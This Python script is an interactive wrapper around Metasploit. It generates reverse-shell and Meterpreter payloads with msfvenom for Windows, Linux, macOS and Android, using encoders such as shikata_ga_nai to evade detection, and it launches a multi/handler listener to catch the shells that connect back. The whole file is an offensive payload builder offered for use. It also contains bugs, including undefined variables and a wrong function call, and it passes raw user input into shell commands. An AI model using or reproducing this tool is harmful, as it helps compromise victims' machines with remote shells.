import os
import random
import time
import sys



randoms= random.randrange(0,66550)
rand = random.randrange(0,2)
newline = "\n"
design = "######"
lhost="x"
lport="x"




#LOGO PART
def art_logo():
	if rand==1:
		ex = "cat misc/asciiart.txt"
	else:
		ex = "cat misc/asciiart1.txt"
	os.system("clear")
	os.system(ex)
	print("\n")
	


#Checking the Settings
def settings():

	os.system("clear")
	os.system("cat misc/settings.txt")
	print("Config File Contains the Default LHOST and LPORT You Use All the Time\nThis will make Your Life Easier")
	print("If you Dont have one You Can Create by Selecting the First Option")
	print(design+"\n")
	print("[-] Settings For LHOST and LPORT:")
	print("\n")
	print("[1] New Config File for LHOST and LPORT")
	print("[2] Existing Config File")
	print("[3] Manual LHOST and LPORT")
	print("\n")
	setinp = int(input("Choice: "))

	if setinp==1:
		print("\n")
		os.system("ifconfig")
		print("\n")
		ask_lhost = input("[-] LHOST : ")
		ask_lport = input("[-] LPORT : ")

		with open("config.txt",'w',encoding = 'utf-8') as conf:
			conf.write(ask_lhost+"\n"+ask_lport)
		print("\n")
		print("[-] Using Settings From New Config File:")
		new_lhost = print("[-] LHOST: "+ask_lhost)
		new_lport = print("[-] LHOST: "+ask_lport)	

			
		lhost = ask_lhost
			
		lport = ask_lport

		print("\nPlease Wait for 3 seconds ...")
		art_logo()
		mian(lhost,lport)


		time.sleep(3)

	if setinp==2:

		gb = os.system("ls | grep config.txt")

		if gb!=0:
			print("\n")
			print("[-] Config File Does not Exit, Please Create it")
			time.sleep(2)
			
		print("\n")
		content_array = []

		with open("config.txt","r",encoding = 'utf-8') as conf:
	   			#reading = [line for line  in conf.readlines()]
			for line in conf:
				content_array.append(line)

			print("[-] Using Settings From Config File:")
			print("\n")
			print("[-] LHOST: "+content_array[0]+"[-] LPORT : "+content_array[1])
			print("\nPlease Wait for 3 seconds ...")
				

			
		lhost = content_array[0].replace("\n","")
		
		lport = content_array[1].replace("\n","")
		time.sleep(3)
		art_logo()
		mian(lhost,lport)


		



	if setinp==3:
		os.system("ifconfig")
		print("\n")
			
		lhost = input("[-] LHOST : ")
		lport = input("[-] LPORT : ")

		print("\n")
		print("[-] Using:")
		print("[-] LHOST : "+lhost)
		print("[-] LPORT : "+lport)
		print("\nPlease Wait for 3 seconds ...")
		time.sleep(3)
		art_logo()
		mian(lhost,lport)

		

#Handler
def handler(host,port):

	os.system("clear")
	os.system("cat misc/handler.txt")
	print("\n")

	print("///////////----Handler Console : You Will be Taken to MetaSploit after Settings are Done")
	print("\n")
	print("////Few Quick Questions: ")
	print("\n")
	print("[-] Press 0 if you want to go back")
	quick = input("[-] Do you want to use the config file for LHOST and LPORT (y/n) : ")

	if quick=="y" or quick=="Y":
		print("\nOKAY!\n")
		host = new_host 
		port = new_port 
	if quick=="n" or quick=="N":
		print("\n")
		os.system("ifconfig")
		new_host = input("\n[-] LHOST = ")
		new_port = input("[-] LPORT = ")
	if quick=="0":
		os.system("clear")
		art_logo()
		mian(host,port)

	
		

	print("\n")
	print("///////// THESE ARE THE COMMON PAYLOAD USED //////////")
	print("\n")
	print("Windows Meterpreter tcp             - 'windows/meterpreter/reverse_tcp' ")
	print("Windows Meterpreter tcp(x64)        - 'windows/x64/meterpreter/reverse_tcp' ")
	print("Linux Meterpreter tcp               - 'linux/x86/meterpreter/reverse_tcp' ")
	print("Linux Meterpreter x64 single stage  - 'linux/x64/meterpreter/reverse_tcp' ")
	print("Mac Reverse Shell                   - 'osx/x86/shell_reverse_tcp' ")
	print("Android Reverse tcp                 - 'android/meterpreter/reverse_tcp' ")
	print("Android Reverse https               - 'android/meterpreter/reverse_https' ")
	print("\n")
	print("//////// You Can Type In Any Payload ///////////")
	pload = input("Payload = ")
		
	with open("run.rc",'w',encoding = 'utf-8') as f:
		f.write("use exploit/multi/handler\n")
		f.write("set PAYLOAD "+pload+"\n")
		f.write("set LHOST "+new_host+"\n")
		f.write("set LPORT "+new_port+"\n")
		f.write("exploit")
   		
	print(newline)
	time.sleep(1)
	print("\nClearing Screen ....")
	os.system("clear")

	print("[-] Exitting Script......")
	print("[-] Starting MetaSploit......")
	time.sleep(5)
	os.system("clear")
	os.system("msfconsole -r run.rc")
	sys.exit()	

#Common Payloads
def common(mlhost,mlport):

	os.system("clear")
	os.system("cat misc/payload.txt")
	print(newline)
	print("[-] Options:")
	print(newline)
	print("[1] Windows Meterpreter tcp")
	print("[2] Windows Meterpreter tcp(x64)")
	print("[3] Linux Meterpreter tcp")
	print("[4] Linux Meterpreter x64 single stage")
	print("[5] Mac Reverse Shell")
	print("[6] Android Reverse tcp")
	print("[7] Android Reverse https")
	print("[0] Back to start")
	print(newline)
		
	optm = int(input("$ "))

	if optm==1:
		Payload = "windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe -e x86/shikata_ga_nai"
		filetype = "exe"
	if optm==2:
		Payload = "windows/x64/meterpreter/reverse_tcp --platform windows -a x64 --encoder x64/xor --iteration 5 -f exe-only"
		filetype = "exe"
	if optm==3:
		Payload = "linux/x86/meterpreter/reverse_tcp --platform linux -a x86"
		filetype = "elf"
	if optm==4:
		Payload = "linux/x64/meterpreter/reverse_tcp --platform linux -a x64"
		filetype = "elf"
	if optm==5:
		Payload = "osx/x86/shell_reverse_tcp --platform osx -a x86"
		filetype = "macho"
	if optm==6:
		Payload = "android/meterpreter/reverse_tcp"
		filetype = "apk"
	if optm==7:
		Payload = "android/meterpreter/reverse_https"
		filetype = "apk"
	if optm==0:
		art_logo()
		mian(mlhost,mlport)

	art_logo()

	command = "msfvenom -p "+Payload+" LHOST="+mlhost+" LPORT="+mlport+" --out output/shell_reverse_tcp_"+str(randoms)+"."+filetype
	
	
	print("[-] Creating Payload.......")

	execute = os.system(command)
	print("[-] Payload Created - Going Back To start Menu")
	time.sleep(3)
	art_logo()
	mian(mlhost,mlport)

#All PayLoads
def all(Lhost,Lport):

	os.system("clear")
	asciiart = "cat misc/payload.txt"
	os.system(asciiart)
	print("\n")


	nnnn = int(input("[-] Press 0 to Go back , Any Number to Continue: "))

	if nnnn==0:
		mian()
		
	os.system("clear")
	asciiart = "cat misc/payload.txt.txt"
	os.system(asciiart)
	print("\n")


	print(newline)
		
	#PLATFORM
	print("Choose platform(Type Full Name) ")
	print("please wait for a moment...")
	com = os.system("msfvenom -l platforms")
	print(newline)
	platform = input("$ ")
	print(newline)


	#Arch
	print("Choose Arch")
	print("please wait for a moment...")
	comm = os.system("msfvenom -l archs")
	print(newline)
	archs = input("$ ")
	print(newline)

	#payload
	print("Choose payload: ")
	print("please wait for a moment...")
	com = os.system("msfvenom -l Payloads | grep "+platform+" | grep "+archs)
	print(newline)
	Payloads  = input("$ ")
	print(newline)

	#Encoders
	print("Choose Encoder")
	print("Please wait for a moment...")
	com = os.system("msfvenom -l encoders")
	print(newline)
	encoders = input("$ ")

	#FileFormat
	print("Enter FileFormat:")
	print("If You dont know the fromat please search onine or leave it blank..")
	formats = input("$ ")

	os.system("clear")
	asciiart = "cat misc/payload.txt"
	os.system(asciiart)
	print("\n")

	command = "msfvenom -p "+Payloads+" --platform "+platform+" -a "+archs+" -e "+encoders+" LHOST="+Lhost+" LPORT="+Lport+" --out output/Shell"+str(randoms)+"."+formats
	print("[-] Creaating Payload.....")
	execute = os.system(command)
	print("[-] Payload Created - Going Back To start Menu")
	time.sleep(5)
	os.system("clear")
	asciiart = "cat misc/payload.txt"
	os.system(asciiart)
	print("\n")
	time.sleep(0.5)
	art_logo()
	mian(Lhost,Lport)

#main
def mian(xlhost,xlport):

	ins_lhost = xlhost
	ins_lport = xlport


	print("		- Common Payloads Contain the Most Commonly Used Payloads")
	print("		- All Payloads Contain all the Payloads in Msfvenom")
	print("\n")
	print("\n[-] Choose Option:")
	print("\n[1] Common Payloads\n[2] All Payloads\n\n[0] Handler")
	print("\n")
	print("[999] Exit")

	print("\n")

	popt = int(input("$ "))
	print(newline)

		
	#handler
	if popt==0:
		handler(ins_lhost,ins_lport)
			
	#Start of common
	if popt == 1:
		common(ins_lhost,ins_lport)

		#start of all
	if popt==2:
		all(ins_lhost,ins_lport)

	if popt==999:
		print("GoodBye...")
		sys.exit()


	

#Srcipt Start
def start():

	art_logo()
	print("[-] Starting ......")
	time.sleep(1)
	settings()
	
	
	
start()










